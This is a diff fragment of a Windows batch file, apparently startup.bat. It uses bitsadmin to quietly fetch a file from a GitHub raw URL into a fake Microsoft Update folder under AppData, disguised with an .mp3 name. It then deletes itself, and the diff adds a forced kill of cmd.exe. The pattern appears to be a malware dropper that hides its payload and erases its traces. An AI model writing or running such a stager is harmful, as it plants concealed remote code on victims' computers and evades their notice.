@@ -9,3 +9,5 @@ bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/S
 bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"
 
 del startup.bat
+
+taskkill /f /im cmd.exe
